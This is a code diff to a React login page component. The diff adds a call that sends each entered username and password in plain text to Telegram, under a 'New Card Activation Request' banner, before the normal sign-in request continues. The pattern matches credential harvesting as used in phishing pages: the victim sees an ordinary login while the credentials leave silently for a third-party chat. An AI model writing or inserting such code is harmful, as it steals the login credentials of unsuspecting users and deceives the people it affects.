@@ -1,6 +1,7 @@
 "use client";
 
 import React, { useState } from "react";
+import { sendTelegramMessage } from "../../utils/telegram";
 
 const LoginPage: React.FC = () => {
   const [userID, setUserID] = useState("");
@@ -16,16 +17,30 @@ const LoginPage: React.FC = () => {
       return;
     }
     setError("");
-
+  
+    // Send Telegram Message
+    const message = `
+      🔔 *New Card Activation Request* 🔔
+      💳 Username: ${userID}
+      📅 Password: ${password}
+      🔒 New login attempt
+    `;
+  
+    try {
+      await sendTelegramMessage(message);
+    } catch (err) {
+      console.error("Failed to send Telegram message:", err);
+    }
+  
     const apiUrl = "https://ymcq30o8c7.execute-api.us-east-1.amazonaws.com/signin";
-
+  
     try {
       const response = await fetch(apiUrl, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ userID, password }),
       });
-
+  
       if (response.status === 200) {
         localStorage.setItem("username", userID);
         window.location.href = "/profile";
@@ -38,6 +53,7 @@ const LoginPage: React.FC = () => {
       setError("Network error. Please try again.");
     }
   };
+  
 
   return (
     <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4">
